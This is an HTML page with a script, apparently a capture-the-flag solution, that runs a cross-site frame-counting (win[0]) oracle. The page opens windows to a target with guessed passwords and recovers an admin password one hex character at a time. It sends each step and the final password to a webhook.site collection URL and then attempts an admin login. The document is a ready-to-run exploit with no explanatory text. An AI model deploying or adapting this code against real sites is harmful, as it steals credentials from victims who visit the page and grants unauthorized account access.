<!DOCTYPE html>
<html>
<head><title>win[0] Frame Access Exploit</title></head>
<body>
<h1>Password leak via win[0] frame access...</h1>
<pre id="output"></pre>
<script>
const output = document.getElementById('output');
const TARGET = 'https://127.0.0.1:9999/';
const WEBHOOK = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

// Frame access oracle - returns true if iframe exists
async function hasFrame(pass) {
    return new Promise((resolve) => {
        const win = window.open(TARGET + '?pass=' + encodeURIComponent(pass), '_blank');
        
        setTimeout(() => {
            let result = false;
            
            try {
                // If iframe exists, win[0] will be defined
                result = (win[0] !== undefined);
            } catch (e) {
                // Cross-origin error also indicates frame exists
                result = true;
            }
            
            win.close();
            resolve(result);
        }, 600); // 600ms for faster execution
    });
}

async function leakPassword() {
    log('[*] WIN[0] FRAME ACCESS ORACLE');
    log('[*] Known prefix: ' + knownPassword);
    log('');
    
    fetch(WEBHOOK + '?status=win0_exploit_started').catch(e=>{});
    
    // Verify oracle works
    log('[*] Verifying oracle...');
    const testGood = await hasFrame('lebah');
    log(`  "lebah" (should be TRUE): ${testGood}`);
    
    const testBad = await hasFrame('lebahZ');
    log(`  "lebahZ" (should be FALSE): ${testBad}`);
    
    if (!testGood || testBad) {
        log('\n❌ Oracle verification failed!');
        fetch(WEBHOOK + '?error=oracle_verification_failed').catch(e=>{});
        return;
    }
    
    log('\n✅ Oracle verified! Starting leak...\n');
    
    // Leak password character by character with PARALLEL testing
    for (let pos = 0; pos < 12; pos++) { // Full 12 chars (lebah + 6 hex)
        log(`[*] Position ${pos + 1}/12...`);
        let found = false;
        
        // Test all 16 characters in parallel!
        const promises = CHARSET.split('').map(c => {
            const candidate = knownPassword + c;
            return hasFrame(candidate).then(match => ({ char: c, match }));
        });
        
        const results = await Promise.all(promises);
        
        // Check results
        for (let r of results) {
            log(`  "${r.char}": ${r.match ? '✓ MATCH!' : '✗'}`);
            
            if (r.match) {
                knownPassword += r.char;
                log(`  [+] Found '${r.char}' -> ${knownPassword}\n`);
                
                // Send progress
                fetch(WEBHOOK + '?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
                
                found = true;
                break;
            }
        }
        
        if (!found) {
            log(`  [-] No match at position ${pos + 1}!`);
            break;
        }
    }
    
    log('\n========================================');
    log('LEAKED PASSWORD: ' + knownPassword);
    log('========================================');
    
    // Final exfiltration
    fetch(WEBHOOK + '?PASSWORD=' + encodeURIComponent(knownPassword)).catch(e=>{});
    
    // Test login
    log('\n[*] Testing login...');
    setTimeout(async () => {
        try {
            const response = await fetch(TARGET + 'login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=admin&password=${encodeURIComponent(knownPassword)}`,
                credentials: 'include',
                redirect: 'manual'
            });
            
            const success = response.type === 'opaqueredirect' || response.status === 0;
            log(`Login test: ${success ? '✅ SUCCESS!' : '❌ Failed'}`);
            
            if (success) {
                fetch(WEBHOOK + '?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
            }
        } catch (e) {
            log('Login test error: ' + e.message);
        }
    }, 1000);
}

setTimeout(leakPassword, 500);
</script>
</body>
</html>
